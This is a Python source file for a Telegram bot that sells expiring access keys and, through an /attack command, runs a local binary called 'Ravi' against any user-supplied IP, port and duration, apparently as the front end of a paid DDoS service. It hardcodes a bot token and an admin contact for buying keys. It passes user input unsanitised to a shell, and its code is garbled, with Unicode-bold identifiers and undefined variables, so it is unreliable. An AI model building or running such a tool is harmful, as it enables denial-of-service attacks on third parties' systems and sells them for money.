import time
import logging
import subprocess
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# 🛑 Blacklisted Ports (Blocked for Attack)
BLACKLISTED_PORTS = {10000, 10001, 10002, 10003, 17500, 20001, 20002, 20003}

# 🔑 Fake Database for Key Management
keys_db = {}  # Format: {key: expiry_time}
user_keys = {}  # Format: {user_id: key}

# ✅ Fixed Admin ID & Telegram Bot Token
ADMIN_ID = 8179218740  # Replace with your Telegram Admin ID
BOT_TOKEN = "7652456509:AAH3Zj9p4yqxS5D4wmitUPbfKiGW7iLtpsk"

# ✅ Logging Configuration
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# 🚀 Start Command
def start(update: Update, context: CallbackContext) -> None:
    start_message = """✨ *Welcome to the Ultimate Control Bot!* ✨

🚀 This bot lets you manage keys, launch attacks, and more!  
🔒 Secure, Fast & Powerful.  

🛠 *Use /help to see all available commands!*  

⚡ *Let's get started!* ⚡  
"""
    update.message.reply_text(𝐬𝐭𝐚𝐫𝐭_𝐦𝐞𝐬𝐬𝐚𝐠𝐞, parse_mode="Markdown")

# 📜 Help Command
def help_command(update: Update, context: CallbackContext) -> None:
    help_text = """🆘 *Available Commands:*
    ✅ /start - Start the system
    ✅ /help - Show available commands
    ✅ /genkey <duration> <unit> - Generate key (Admin only)
    ✅ /redeem <key> - Redeem a key
    ✅ /list_key - View active keys (Admin only)
    ✅ /delete_key <key> - Delete a key (Admin only)
    ✅ /attack <ip> <port> <time> - Start an attack (Redeemed users only)
"""
    update.message.reply_text(𝐡𝐞𝐥𝐩_𝐭𝐞𝐱𝐭, parse_mode="Markdown")

# 🎟️ Function to Generate Key (Only Admin)
def genkey(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ *𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!* 𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧 𝐜𝐚𝐧 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬.", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 2:
        update.message.reply_text("⚠️ *Usage:* /genkey <duration> <unit> (minutes/hours/days/weeks)", parse_mode="Markdown")
        return

    duration, unit = args
    expiry_time = datetime.now()
    
    if unit == "minutes":
        expiry_time += timedelta(minutes=int(duration))
    elif unit == "hours":
        expiry_time += timedelta(hours=int(duration))
    elif unit == "days":
        expiry_time += timedelta(days=int(duration))
    elif unit == "weeks":
        expiry_time += timedelta(weeks=int(duration))
    else:
        update.message.reply_text("❌ *𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐮𝐧𝐢𝐭!* 𝐔𝐬𝐞 𝐦𝐢𝐧𝐮𝐭𝐞𝐬/𝐡𝐨𝐮𝐫𝐬/𝐝𝐚𝐲𝐬/𝐰𝐞𝐞𝐤𝐬.", parse_mode="Markdown")
        return

    new_key = f"KEY{len(keys_db) + 1}"
    keys_db[new_key] = expiry_time
    update.message.reply_text(f"✅ *Key Generated:* `{new_key}` (Expires in {duration} {unit})", parse_mode="Markdown")

# 🎯 Function to Redeem Key (Any User)
def redeem(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) != 1:
        update.message.reply_text("📌 *𝐄𝐱𝐚𝐦𝐩𝐥𝐞:* /𝐫𝐞𝐝𝐞𝐞𝐦 <𝐤𝐞𝐲>", parse_mode="Markdown")
        return
    
    key = args[0]
    user_id = update.message.from_user.id

    if key in keys_db and datetime.now() < keys_db[key]:
        user_keys[user_id] = key
        update.message.reply_text(𝐟"✅ *𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦𝐞𝐝:* `{𝐤𝐞𝐲}`", parse_mode="Markdown")
    else:
        update.message.reply_text("❌ *𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 𝐊𝐞𝐲!*", parse_mode="Markdown")

# 📜 Function to List Active Keys (Only Admin)
def list_keys(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ *𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!* 𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧 𝐜𝐚𝐧 𝐯𝐢𝐞𝐰 𝐤𝐞𝐲𝐬.", parse_mode="Markdown")
        return

    if not keys_db:
        update.message.reply_text("❌ *𝐍𝐨 𝐀𝐜𝐭𝐢𝐯𝐞 𝐊𝐞𝐲𝐬!*", parse_mode="Markdown")
        return
    
    key_list = "\n".join([f"🔑 `{k}` - Expires: {v}" for k, v in keys_db.items()])
    update.message.reply_text(𝐟"📜 *𝐀𝐜𝐭𝐢𝐯𝐞 𝐊𝐞𝐲𝐬:*\𝐧{𝐤𝐞𝐲_𝐥𝐢𝐬𝐭}", parse_mode="Markdown")

# ❌ Function to Delete Key (Only Admin)
def delete_key(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ *𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!* 𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧 𝐜𝐚𝐧 𝐝𝐞𝐥𝐞𝐭𝐞 𝐤𝐞𝐲𝐬.", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 1:
        update.message.reply_text("⚠️ *𝐔𝐬𝐚𝐠𝐞:* /𝐝𝐞𝐥𝐞𝐭𝐞_𝐤𝐞𝐲 <𝐤𝐞𝐲>", parse_mode="Markdown")
        return

    key = args[0]
    if key in keys_db:
        del keys_db[key]
        update.message.reply_text(𝐟"🗑 *𝐊𝐞𝐲 𝐃𝐞𝐥𝐞𝐭𝐞𝐝:* `{𝐤𝐞𝐲}`", parse_mode="Markdown")
    else:
        update.message.reply_text("❌ *𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐊𝐞𝐲!*", parse_mode="Markdown")

# ⚔️ Attack Command (With Correct `{}` Execution Format)
def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in user_keys:
        update.message.reply_text("⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀\𝐧🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\𝐧• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻: ➡️ @𝐒𝐈𝐃𝐈𝐊𝐈_𝐌𝐔𝐒𝐓𝐀𝐅𝐀_𝟒𝟕.", parse_mode="Markdown")
        return

    key = user_keys[user_id]
    if datetime.now() > keys_db[key]:
        update.message.reply_text("❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 3:
        update.message.reply_text("⚠️ *𝐔𝐬𝐚𝐠𝐞:* /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>", parse_mode="Markdown")
        return

    ip, port, duration = args

    if int(port) in BLACKLISTED_PORTS:
        update.message.reply_text(𝐟"❌ *𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐥𝐨𝐜𝐤𝐞𝐝!* 𝐏𝐨𝐫𝐭 `{𝐩𝐨𝐫𝐭}` 𝐢𝐬 𝐛𝐥𝐚𝐜𝐤𝐥𝐢𝐬𝐭𝐞𝐝.", parse_mode="Markdown")
        return

    update.message.reply_text(𝐟"🚨 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗! \𝐧\𝐧🎯 𝗧𝗮𝗿𝗴𝗲𝘁 : {𝐭𝐚𝐫𝐠𝐞𝐭}\𝐧🔌 𝗣𝗼𝗿𝘁: {𝐩𝐨𝐫𝐭}\𝐧⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {𝐭𝐢𝐦𝐞} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\𝐧⚡𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐀𝐭𝐭𝐚𝐜𝐤 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬.", parse_mode="Markdown")

    # ✅ Correct execution format
    command = f"./Ravi {ip} {port} {duration} 1000"

    # ✅ Print command in terminal logs
    print(f"Binary Executing: {command}")

    try:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # ✅ Attack complete hone ke 5 second baad message bhejo
        time.sleep(5)
        update.message.reply_text(𝐟"✅𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬\𝐧\𝐧🎯 𝗧𝗮𝗿𝗴𝗲𝘁 : {𝐭𝐚𝐫𝐠𝐞𝐭}\𝐧🔌 𝗣𝗼𝗿𝘁: {𝐩𝐨𝐫𝐭}\𝐧⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {𝐭𝐢𝐦𝐞} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\𝐧⚡𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲.", parse_mode="Markdown")

    except Exception as e:
        update.message.reply_text(𝐟"❌ *𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝!*", parse_mode="Markdown")

# 🔥 Telegram Bot Setup
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("genkey", genkey))
    dp.add_handler(CommandHandler("redeem", redeem))
    dp.add_handler(CommandHandler("list_key", list_keys))
    dp.add_handler(CommandHandler("delete_key", delete_key))
    dp.add_handler(CommandHandler("attack", attack))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
